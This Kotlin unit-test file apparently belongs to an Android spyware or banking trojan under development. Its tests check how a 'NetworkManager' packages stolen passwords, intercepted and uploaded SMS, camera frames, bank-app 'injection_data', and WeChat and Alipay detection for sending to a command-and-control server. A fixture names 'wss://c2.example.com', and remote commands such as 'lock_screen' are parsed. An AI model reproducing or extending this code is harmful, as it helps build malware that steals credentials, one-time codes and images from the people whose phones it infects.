package com.storm.safe.rock.service.modules

import android.content.Context
import com.storm.safe.rock.network.DataSyncClient
import org.json.JSONObject
import org.junit.Assert.*
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment

/**
 * Test helper: captures messages sent via DataSyncClient.send().
 */
class TestDataSyncClient(context: Context) : DataSyncClient(context, {}, {}) {
    val sentMessages = mutableListOf<String>()

    override fun send(message: String): Boolean {
        sentMessages.add(message)
        return true
    }

    /** Return the last sent message parsed as JSONObject, or null. */
    fun lastEnvelope(): JSONObject? {
        return sentMessages.lastOrNull()?.let { JSONObject(it) }
    }
}

@RunWith(RobolectricTestRunner::class)
class NetworkManagerTest {

    private lateinit var manager: NetworkManager
    private lateinit var testClient: TestDataSyncClient

    @Before
    fun setup() {
        manager = NetworkManager()
        val context = RuntimeEnvironment.getApplication()
        testClient = TestDataSyncClient(context)
        testClient.isConnected = true
    }

    // ---------------------------------------------------------------
    // initialize()
    // ---------------------------------------------------------------

    @Test
    fun `initialize creates manager without crashing`() {
        val context = RuntimeEnvironment.getApplication()
        val mgr = NetworkManager()
        mgr.initialize(context)
        // Should not crash; dataSyncClient is created internally
    }

    // ---------------------------------------------------------------
    // connectToServer()
    // ---------------------------------------------------------------

    @Test
    fun `connectToServer stores url and deviceId`() {
        manager.connectToServer("wss://example.com", "dev-001")
        assertEquals("wss://example.com", manager.serverUrl)
        assertEquals("dev-001", manager.deviceId)
    }

    @Test
    fun `connectToServer with empty url does not crash`() {
        manager.connectToServer("", "dev-001")
        assertEquals("", manager.serverUrl)
    }

    // ---------------------------------------------------------------
    // sendEvent() — generic event
    // ---------------------------------------------------------------

    @Test
    fun `sendEvent builds envelope with correct type field`() {
        manager.setTestClient(testClient, "dev-123")
        val data = JSONObject().put("key", "value")
        manager.sendEvent("custom_event", data)

        val envelope = testClient.lastEnvelope()
        assertNotNull("Envelope should be sent", envelope)
        assertEquals("custom_event", envelope!!.getString("type"))
        assertEquals("dev-123", envelope.getString("sessionId"))
        assertTrue(envelope.has("data"))
        assertTrue(envelope.has("timestamp"))
        assertEquals("value", envelope.getJSONObject("data").getString("key"))
    }

    @Test
    fun `sendEvent returns gracefully when client is null`() {
        // No client set — should not crash
        manager.sendEvent("test", JSONObject())
    }

    // ---------------------------------------------------------------
    // sendPasswordData()
    // ---------------------------------------------------------------

    @Test
    fun `sendPasswordData builds correct envelope`() {
        manager.setTestClient(testClient, "dev-pw")
        val data = JSONObject().put("password", "s3cret")
        manager.sendPasswordData(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("password_data", envelope!!.getString("type"))
        assertEquals("dev-pw", envelope.getString("sessionId"))
        assertEquals("s3cret", envelope.getJSONObject("data").getString("password"))
    }

    @Test
    fun `sendPasswordData does nothing when client is null`() {
        manager.sendPasswordData(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ---------------------------------------------------------------
    // sendIncomingSms()
    // ---------------------------------------------------------------

    @Test
    fun `sendIncomingSms builds correct envelope`() {
        manager.setTestClient(testClient, "dev-sms")
        val data = JSONObject().put("number", "+1234567890").put("text", "Hello")
        manager.sendIncomingSms(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("incoming_sms", envelope!!.getString("type"))
        assertEquals("dev-sms", envelope.getString("sessionId"))
    }

    @Test
    fun `sendIncomingSms does nothing when client is null`() {
        manager.sendIncomingSms(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ---------------------------------------------------------------
    // uploadSms()
    // ---------------------------------------------------------------

    @Test
    fun `uploadSms builds correct envelope`() {
        manager.setTestClient(testClient, "dev-upload")
        val data = JSONObject().put("messages", "batch")
        manager.uploadSms(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("sms_upload", envelope!!.getString("type"))
        assertEquals("dev-upload", envelope.getString("sessionId"))
    }

    @Test
    fun `uploadSms does nothing when client is null`() {
        manager.uploadSms(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ---------------------------------------------------------------
    // sendCameraFrame()
    // ---------------------------------------------------------------

    @Test
    fun `sendCameraFrame builds correct envelope with base64 and mode`() {
        manager.setTestClient(testClient, "dev-cam")
        manager.sendCameraFrame("aGVsbG8=", "front")

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("camera_frame", envelope!!.getString("type"))
        assertEquals("dev-cam", envelope.getString("sessionId"))
        val data = envelope.getJSONObject("data")
        assertEquals("aGVsbG8=", data.getString("image"))
        assertEquals("front", data.getString("mode"))
        assertTrue(data.has("timestamp"))
    }

    @Test
    fun `sendCameraFrame does nothing when client is null`() {
        manager.sendCameraFrame("data", "full")
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ---------------------------------------------------------------
    // uploadInjectionData()
    // ---------------------------------------------------------------

    @Test
    fun `uploadInjectionData builds correct envelope`() {
        manager.setTestClient(testClient, "dev-inj")
        val data = JSONObject().put("app", "com.bank.app")
        manager.uploadInjectionData(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("injection_data", envelope!!.getString("type"))
    }

    @Test
    fun `uploadInjectionData does nothing when client is null`() {
        manager.uploadInjectionData(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ---------------------------------------------------------------
    // sendPermissionsUpdate()
    // ---------------------------------------------------------------

    @Test
    fun `sendPermissionsUpdate builds correct envelope`() {
        manager.setTestClient(testClient, "dev-perm")
        val data = JSONObject().put("sms", true).put("camera", false)
        manager.sendPermissionsUpdate(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("permissions_update", envelope!!.getString("type"))
        assertEquals("dev-perm", envelope.getString("sessionId"))
    }

    @Test
    fun `sendPermissionsUpdate does nothing when client is null`() {
        manager.sendPermissionsUpdate(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ---------------------------------------------------------------
    // sendPermissionResponse()
    // ---------------------------------------------------------------

    @Test
    fun `sendPermissionResponse builds correct envelope`() {
        manager.setTestClient(testClient, "dev-presp")
        val data = JSONObject().put("granted", true)
        manager.sendPermissionResponse(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("permission_response", envelope!!.getString("type"))
    }

    @Test
    fun `sendPermissionResponse does nothing when client is null`() {
        manager.sendPermissionResponse(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ---------------------------------------------------------------
    // sendScreenLockStatus()
    // ---------------------------------------------------------------

    @Test
    fun `sendScreenLockStatus builds correct envelope`() {
        manager.setTestClient(testClient, "dev-lock")
        val data = JSONObject().put("locked", true)
        manager.sendScreenLockStatus(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("screen_lock_status", envelope!!.getString("type"))
    }

    @Test
    fun `sendScreenLockStatus does nothing when client is null`() {
        manager.sendScreenLockStatus(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ---------------------------------------------------------------
    // sendOperationLog()
    // ---------------------------------------------------------------

    @Test
    fun `sendOperationLog builds correct envelope`() {
        manager.setTestClient(testClient, "dev-log")
        val data = JSONObject().put("action", "screenshot")
        manager.sendOperationLog(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("operation_log", envelope!!.getString("type"))
    }

    @Test
    fun `sendOperationLog does nothing when client is null`() {
        manager.sendOperationLog(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ---------------------------------------------------------------
    // sendWechatDetectionStatus()
    // ---------------------------------------------------------------

    @Test
    fun `sendWechatDetectionStatus builds correct envelope`() {
        manager.setTestClient(testClient, "dev-wc")
        val data = JSONObject().put("installed", true)
        manager.sendWechatDetectionStatus(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("wechat_detection", envelope!!.getString("type"))
    }

    @Test
    fun `sendWechatDetectionStatus does nothing when client is null`() {
        manager.sendWechatDetectionStatus(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ---------------------------------------------------------------
    // sendAlipayDetectionStatus()
    // ---------------------------------------------------------------

    @Test
    fun `sendAlipayDetectionStatus builds correct envelope`() {
        manager.setTestClient(testClient, "dev-ali")
        val data = JSONObject().put("installed", false)
        manager.sendAlipayDetectionStatus(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("alipay_detection", envelope!!.getString("type"))
    }

    @Test
    fun `sendAlipayDetectionStatus does nothing when client is null`() {
        manager.sendAlipayDetectionStatus(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ---------------------------------------------------------------
    // sendAutoPasswordDetectionStatus()
    // ---------------------------------------------------------------

    @Test
    fun `sendAutoPasswordDetectionStatus builds correct envelope`() {
        manager.setTestClient(testClient, "dev-auto")
        val data = JSONObject().put("enabled", true)
        manager.sendAutoPasswordDetectionStatus(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("auto_password_detection", envelope!!.getString("type"))
    }

    @Test
    fun `sendAutoPasswordDetectionStatus does nothing when client is null`() {
        manager.sendAutoPasswordDetectionStatus(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ---------------------------------------------------------------
    // notifyLocalServiceFullConfig()
    // ---------------------------------------------------------------

    @Test
    fun `notifyLocalServiceFullConfig builds correct envelope`() {
        manager.setTestClient(testClient, "dev-cfg")
        val data = JSONObject().put("serverAddr", "wss://c2.example.com")
        manager.notifyLocalServiceFullConfig(data)

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        assertEquals("local_service_config", envelope!!.getString("type"))
        assertEquals("dev-cfg", envelope.getString("sessionId"))
    }

    @Test
    fun `notifyLocalServiceFullConfig does nothing when client is null`() {
        manager.notifyLocalServiceFullConfig(JSONObject())
        assertTrue(testClient.sentMessages.isEmpty())
    }

    // ---------------------------------------------------------------
    // handleRemoteCommand()
    // ---------------------------------------------------------------

    @Test
    fun `handleRemoteCommand parses valid command JSON without crashing`() {
        manager.setTestClient(testClient, "dev-cmd")
        val cmd = JSONObject()
            .put("command", "lock_screen")
            .put("params", JSONObject().put("duration", 30))
        manager.handleRemoteCommand(cmd.toString())
        // Should complete without crashing; real dispatch in Phase 8
    }

    @Test
    fun `handleRemoteCommand handles invalid JSON gracefully`() {
        manager.setTestClient(testClient, "dev-cmd")
        manager.handleRemoteCommand("not valid json{{{")
        // Should not crash
    }

    @Test
    fun `handleRemoteCommand handles empty string gracefully`() {
        manager.handleRemoteCommand("")
        // Should not crash
    }

    // ---------------------------------------------------------------
    // startWebSocketKeepAlive()
    // ---------------------------------------------------------------

    @Test
    fun `startWebSocketKeepAlive does not crash when client is null`() {
        manager.startWebSocketKeepAlive()
        // Stub: should not crash
    }

    @Test
    fun `startWebSocketKeepAlive does not crash when client is set`() {
        manager.setTestClient(testClient, "dev-ka")
        manager.startWebSocketKeepAlive()
        // Stub: should not crash
    }

    // ---------------------------------------------------------------
    // Envelope structure verification — all send methods share pattern
    // ---------------------------------------------------------------

    @Test
    fun `all envelopes contain timestamp as Long`() {
        manager.setTestClient(testClient, "dev-ts")
        val before = System.currentTimeMillis()
        manager.sendOperationLog(JSONObject().put("action", "test"))
        val after = System.currentTimeMillis()

        val envelope = testClient.lastEnvelope()
        assertNotNull(envelope)
        val ts = envelope!!.getLong("timestamp")
        assertTrue("Timestamp should be >= before", ts >= before)
        assertTrue("Timestamp should be <= after", ts <= after)
    }

    @Test
    fun `all envelopes contain sessionId matching deviceId`() {
        manager.setTestClient(testClient, "session-abc")
        manager.sendPasswordData(JSONObject().put("pw", "x"))
        manager.sendIncomingSms(JSONObject().put("n", "1"))
        manager.sendOperationLog(JSONObject().put("a", "b"))

        assertEquals(3, testClient.sentMessages.size)
        for (raw in testClient.sentMessages) {
            val env = JSONObject(raw)
            assertEquals("session-abc", env.getString("sessionId"))
        }
    }

    // ---------------------------------------------------------------
    // Multiple sends accumulate
    // ---------------------------------------------------------------

    @Test
    fun `multiple send calls accumulate messages`() {
        manager.setTestClient(testClient, "dev-multi")
        manager.sendPasswordData(JSONObject())
        manager.sendIncomingSms(JSONObject())
        manager.uploadSms(JSONObject())
        manager.sendCameraFrame("img", "back")
        manager.uploadInjectionData(JSONObject())
        manager.sendPermissionsUpdate(JSONObject())
        manager.sendPermissionResponse(JSONObject())
        manager.sendScreenLockStatus(JSONObject())
        manager.sendOperationLog(JSONObject())
        manager.sendWechatDetectionStatus(JSONObject())
        manager.sendAlipayDetectionStatus(JSONObject())
        manager.sendAutoPasswordDetectionStatus(JSONObject())
        manager.notifyLocalServiceFullConfig(JSONObject())
        manager.sendEvent("generic", JSONObject())

        assertEquals(14, testClient.sentMessages.size)

        // Verify each has a distinct type
        val types = testClient.sentMessages.map { JSONObject(it).getString("type") }
        assertEquals(14, types.toSet().size)
    }
}
